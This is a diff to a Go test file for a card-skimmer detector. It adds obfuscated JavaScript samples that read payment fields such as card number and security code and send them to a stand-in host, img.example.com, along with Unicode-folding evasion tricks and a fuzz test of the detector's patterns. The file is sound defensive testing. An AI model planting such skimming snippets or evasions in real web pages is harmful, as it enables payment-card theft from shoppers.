@@ -319,6 +319,8 @@ func TestSkimmerSignalsOnTokens(t *testing.T) {
 		"spaced member":        fields + `navigator. sendBeacon("https://img.example.com/p",f.value)`,
 		"member by string":     fields + `navigator['send'+'Beacon']("https://img.example.com/p",f.value)`,
 		"joined host":          fields + `fetch("https://"+"img.example.com/p",{method:"POST",body:f.value})`,
+		"built decoder name":   `var f=document.querySelector('[name="'+globalThis['at'+'ob']('cGF5bWVudFtjY19udW1iZXJd')+'"]');new Image().src="https://img.example.com/p?d="+f.value`,
+		"folded letter":        `var n='ſecurity_code'.toUpperCase().toLowerCase();new Image().src="https://img.example.com/p?d="+n`,
 		"escaped atob":         `var n=\u0061tob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd");var f=document.querySelector(n);`,
 	} {
 		if skimmerSignals([]byte(src)) == nil {
@@ -333,21 +335,40 @@ func TestAnchoredSearchesMatchThePatterns(t *testing.T) {
 	parts := []string{"cc", "_", "number", "card", "holder", "cvv", "2", "cvc", "security", "-code", "expir", "ation", "_month",
 		"payment[", "x", " ", ".", "new", "(", ")", "Image", "window", "WebSocket", "sendBeacon", "fetch", "'", `"`, "https:", "//",
 		"a.example", "POST", ",", "url", ":", "$.", "ajax", ".open", "no-cors", "querySelectorAll", "input", "elements", "FormData",
-		"XMLHttpRequest", "atob", "String.fromCharCode", "Function", "eval", "unescape", `\x41`, "=", "QUJD", "+", "/"}
+		"XMLHttpRequest", "atob", "String.fromCharCode", "Function", "eval", "unescape", `\x41`, "=", "QUJD", "+", "/",
+		strings.Repeat("(", 70), strings.Repeat(")", 70), "https://" + strings.Repeat("a", 63) + ".example.com/p", strings.Repeat("x", 300),
+		"\u017f", "\u212a", "ſecurity_code", "\u212aard", ";", "  "}
 	rng := rand.New(rand.NewPCG(1, 2)) //nolint:gosec // a seeded generator, so a failure repeats
+	// What earlier windows of a fixed width missed, whole.
+	for _, text := range []string{
+		"new" + strings.Repeat("(", 70) + "Image" + strings.Repeat(")", 70) + "().src=1",
+		"new" + strings.Repeat("(", 70) + "window.Image" + strings.Repeat(")", 70) + "()",
+		"fetch('https://" + strings.Repeat("a", 53) + ".example.com/p?d='+f.value)",
+		"x.open('POST','https://" + strings.Repeat("a", 60) + ".example.com/p')",
+		"new" + strings.Repeat("(", 70) + "Function" + strings.Repeat(")", 70) + "('x')",
+		"'ſecurity_code'",
+	} {
+		lower := lowerFold([]byte(text))
+		got := matchNear(paymentFieldsLower, lower, paymentAnchors) || matchNear(exfiltrationLower, lower, exitAnchors) || hidden([]byte(text))
+		if !got {
+			t.Errorf("%.60q...: missed", text)
+		}
+	}
 	for range 20000 {
 		var b strings.Builder
-		for range 1 + rng.IntN(24) {
+		for range 1 + rng.IntN(32) {
 			b.WriteString(parts[rng.IntN(len(parts))])
 		}
 		text := []byte(b.String())
-		lower := lowerASCII(text)
+		lower := lowerFold(text)
+		// The regions against the full patterns on the same folded text; the folding has cases of
+		// its own above.
 		for name, c := range map[string][2]bool{
-			"fields":  {matchNear(paymentFieldsLower, lower, paymentAnchors), paymentFields.Match(text)},
-			"harvest": {matchNear(formHarvestLower, lower, harvestAnchors), formHarvest.Match(text)},
-			"exits":   {matchNear(exfiltrationLower, lower, exitAnchors), exfiltration.Match(text)},
-			"sends":   {matchNear(sendsLower, lower, sendAnchors), sends.Match(text)},
-			"hidden":  {hidden(text), obfuscation.Match(text) || reversed.Match(text)},
+			"fields":  {matchNear(paymentFieldsLower, lower, paymentAnchors), paymentFields.Match(lower)},
+			"harvest": {matchNear(formHarvestLower, lower, harvestAnchors), formHarvest.Match(lower)},
+			"exits":   {matchNear(exfiltrationLower, lower, exitAnchors), exfiltration.Match(lower)},
+			"sends":   {matchNear(sendsLower, lower, sendAnchors), sends.Match(lower)},
+			"hidden":  {hidden(text), obfuscation.Match(lower) || reversed.Match(text)},
 		} {
 			if c[0] != c[1] {
 				t.Fatalf("%s on %q: %v, the pattern says %v", name, text, c[0], c[1])
